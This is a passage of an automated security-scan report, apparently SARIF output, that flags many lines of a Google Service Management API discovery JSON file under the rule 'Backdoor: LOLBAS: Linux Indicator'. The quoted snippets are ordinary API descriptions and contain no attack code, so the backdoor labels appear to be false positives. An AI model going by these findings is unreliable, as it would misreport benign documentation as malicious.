                      "markdown": "`              \"path\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"flatPath\": \"v1/services/{serviceName}/configs/{configId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2946,
                  "startColumn": 54,
                  "endLine": 2946,
                  "endColumn": 63,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Lists the history of the service config for a managed service,\\nfrom the newest to the oldest.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Lists the history of the service config for a managed service,\\nfrom the newest to the oldest.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/configs\",\n              \"flatPath\": \"v1/services/{serviceName}/configs\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Lists the history of the service config for a managed service,\\nfrom the newest to the oldest.\\n\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2854,
                  "startColumn": 61,
                  "endLine": 2854,
                  "endColumn": 70,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"PATCH\",\n          \"description\": \"Updates the specified subset of the service resource. Equivalent to\\ncalling `PatchService` with only the `service_config` field updated.\\n\\nOperation<response: google.api.Service>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"PATCH\",\n          \"description\": \"Updates the specified subset of the service resource. Equivalent to\\ncalling `PatchService` with only the `service_config` field updated.\\n\\nOperation<response: google.api.Service>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"PATCH\",\n          \"description\": \"Updates the specified subset of the service resource. Equivalent to\\ncalling `PatchService` with only the `service_config` field updated.\\n\\nOperation<response: google.api.Service>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2829,
                  "startColumn": 127,
                  "endLine": 2829,
                  "endColumn": 136,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"updateMask\": {\n              \"description\": \"A mask specifying which fields to update.\\nUpdate mask has been deprecated on UpdateServiceConfig service method.\\nPlease use PatchServiceConfig method instead to do partial updates.\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"updateMask\": {\n              \"description\": \"A mask specifying which fields to update.\\nUpdate mask has been deprecated on UpdateServiceConfig service method.\\nPlease use PatchServiceConfig method instead to do partial updates.\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                      "markdown": "`              \"type\": \"string\"\n            },\n            \"updateMask\": {\n              \"description\": \"A mask specifying which fields to update.\\nUpdate mask has been deprecated on UpdateServiceConfig service method.\\nPlease use PatchServiceConfig method instead to do partial updates.\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2820,
                  "startColumn": 61,
                  "endLine": 2820,
                  "endColumn": 70,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Updates the specified subset of the service resource. Equivalent to\\ncalling `UpdateService` with only the `service_config` field updated.\\n\\nOperation<response: google.api.Service>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Updates the specified subset of the service resource. Equivalent to\\ncalling `UpdateService` with only the `service_config` field updated.\\n\\nOperation<response: google.api.Service>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Updates the specified subset of the service resource. Equivalent to\\ncalling `UpdateService` with only the `service_config` field updated.\\n\\nOperation<response: google.api.Service>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2761,
                  "startColumn": 121,
                  "endLine": 2761,
                  "endColumn": 130,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"updateMask\": {\n              \"description\": \"A mask specifying which fields to update.\\nUpdate mask has been deprecated on UpdateService service method. Please\\nuse PatchService method instead to do partial updates.\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"updateMask\": {\n              \"description\": \"A mask specifying which fields to update.\\nUpdate mask has been deprecated on UpdateService service method. Please\\nuse PatchService method instead to do partial updates.\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                      "markdown": "`              \"type\": \"string\"\n            },\n            \"updateMask\": {\n              \"description\": \"A mask specifying which fields to update.\\nUpdate mask has been deprecated on UpdateService service method. Please\\nuse PatchService method instead to do partial updates.\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2752,
                  "startColumn": 83,
                  "endLine": 2752,
                  "endColumn": 92,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}\",\n          \"flatPath\": \"v1/services/{serviceName}\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Updates the configuration of a service.  If the specified service does not\\nalready exist, then it is created.\\n\\nOperation<response: ManagedService>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}\",\n          \"flatPath\": \"v1/services/{serviceName}\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Updates the configuration of a service.  If the specified service does not\\nalready exist, then it is created.\\n\\nOperation<response: ManagedService>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}\",\n          \"flatPath\": \"v1/services/{serviceName}\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Updates the configuration of a service.  If the specified service does not\\nalready exist, then it is created.\\n\\nOperation<response: ManagedService>\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2727,
                  "startColumn": 83,
                  "endLine": 2727,
                  "endColumn": 92,
                  "snippet": {
                    "text": "          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                      "markdown": "`          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2727,
                  "startColumn": 41,
                  "endLine": 2727,
                  "endColumn": 50,
                  "snippet": {
                    "text": "          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                      "markdown": "`          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2724,
                  "startColumn": 123,
                  "endLine": 2724,
                  "endColumn": 132,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2724,
                  "startColumn": 74,
                  "endLine": 2724,
                  "endColumn": 83,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2724,
                  "startColumn": 43,
                  "endLine": 2724,
                  "endColumn": 52,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}:disable\",\n          \"flatPath\": \"v1/services/{serviceName}:disable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Disable a managed service for a project.\\nGoogle Service Management will only disable the managed service even if\\nthere are other services depend on the managed service.\\n\\nOperation<response: DisableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to disable. Specifying an unknown service name\\nwill cause the request to fail.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2699,
                  "startColumn": 82,
                  "endLine": 2699,
                  "endColumn": 91,
                  "snippet": {
                    "text": "          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                      "markdown": "`          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2699,
                  "startColumn": 41,
                  "endLine": 2699,
                  "endColumn": 50,
                  "snippet": {
                    "text": "          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n",
                      "markdown": "`          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n              \"location\": \"path\",\n              \"required\": true,\n              \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2696,
                  "startColumn": 102,
                  "endLine": 2696,
                  "endColumn": 111,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}:enable\",\n          \"flatPath\": \"v1/services/{serviceName}:enable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}:enable\",\n          \"flatPath\": \"v1/services/{serviceName}:enable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}:enable\",\n          \"flatPath\": \"v1/services/{serviceName}:enable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2696,
                  "startColumn": 42,
                  "endLine": 2696,
                  "endColumn": 51,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}:enable\",\n          \"flatPath\": \"v1/services/{serviceName}:enable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}:enable\",\n          \"flatPath\": \"v1/services/{serviceName}:enable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}:enable\",\n          \"flatPath\": \"v1/services/{serviceName}:enable\",\n          \"httpMethod\": \"POST\",\n          \"description\": \"Enable a managed service for a project with default setting.\\nIf the managed service has dependencies, they will be enabled as well.\\n\\nOperation<response: EnableServiceResponse>\\n\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"Name of the service to enable. Specifying an unknown service name will\\ncause the request to fail.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2654,
                  "startColumn": 43,
                  "endLine": 2654,
                  "endColumn": 52,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"configId\": {\n              \"description\": \"The id of the service config resource.\\nOptional. If it is not specified, the latest version of config will be\\nreturned.\",\n              \"location\": \"query\",\n              \"type\": \"string\"\n            }\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"configId\": {\n              \"description\": \"The id of the service config resource.\\nOptional. If it is not specified, the latest version of config will be\\nreturned.\",\n              \"location\": \"query\",\n              \"type\": \"string\"\n            }\n",
